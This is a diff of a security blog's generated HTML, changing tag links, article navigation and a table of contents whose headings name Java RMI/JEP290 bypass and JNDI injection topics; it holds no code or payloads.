+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RMI</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">RMI</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">JEP290</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">enableReplace</a>
         		</li>
       		
 		</ul>
@@ -366,18 +403,18 @@ ResourceRef(String resourceClass, String description, String scope, String auth,
   
 <nav id="article-nav">
   
-    <a href="/2020/07/16/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/07/16/JNDI%EF%BC%9AJNDI-RMI%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          RMI：绕过JEP290——中
+          JNDI：JNDI-RMI 注入及绕过JDK高版本限制
         
       </div>
     </a>
   
   
-    <a href="/2020/07/02/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8A/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">RMI：绕过JEP290——上</div>
+    <a href="/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">RMI：绕过JEP290——中</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -404,7 +441,7 @@ ResourceRef(String resourceClass, String description, String scope, String auth,
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-RMI-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">JNDI-RMI 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SHOW-ME-THE-CODE"><span class="toc-number">1.1.</span> <span class="toc-text">SHOW ME THE CODE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8ERMI%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.2.</span> <span class="toc-text">与RMI远程调用的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">版本限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E9%80%BB%E8%BE%91"><span class="toc-number">1.3.1.</span> <span class="toc-text">限制逻辑</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">绕过高版本限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-RMI-Evil-Server-Code%E8%A7%A3%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">JNDI-RMI Evil Server Code解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.1.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">2.2.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">POC分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%85%B6%E4%BB%96%E7%9A%84Reference%E7%B1%BB%EF%BC%9Aorg-apache-naming-ResourceRef"><span class="toc-number">2.3.1.</span> <span class="toc-text">1. 其他的Reference类：org.apache.naming.ResourceRef</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-javax-naming-spi-ObjectFactory"><span class="toc-number">2.3.2.</span> <span class="toc-text">2. javax.naming.spi.ObjectFactory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-org-apache-naming-factory-BeanFactory"><span class="toc-number">2.3.3.</span> <span class="toc-text">3. org.apache.naming.factory.BeanFactory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AE%9E%E4%BE%8B%E5%8C%96%E8%BF%87%E7%A8%8B%E5%8F%AF%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84%E7%B1%BB"><span class="toc-number">2.3.4.</span> <span class="toc-text">4. 实例化过程可被利用的类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JEP290-JRMP%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">JEP290 JRMP绕过原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8u231%E9%99%90%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">8u231限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#An-Trinh%E7%9A%84RMI%E6%B3%A8%E5%86%8C%E7%AB%AF%E7%9A%84Bypass%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">An Trinh的RMI注册端的Bypass方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E9%80%81%E5%BA%8F%E5%88%97%E5%8C%96Payload"><span class="toc-number">1.2.3.</span> <span class="toc-text">如何发送序列化Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0lookup-object"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">实现lookup(object)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#enableReplace-false"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">enableReplace&#x3D;false</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87bind%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">通过bind攻击</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -687,6 +724,10 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Mysql</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">MySQL</a>
               </li>
              
@@ -724,6 +765,18 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">RASP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XXE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Fabric</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">CodeQL</a>
               </li>
             
             <div class="clearfix"></div>
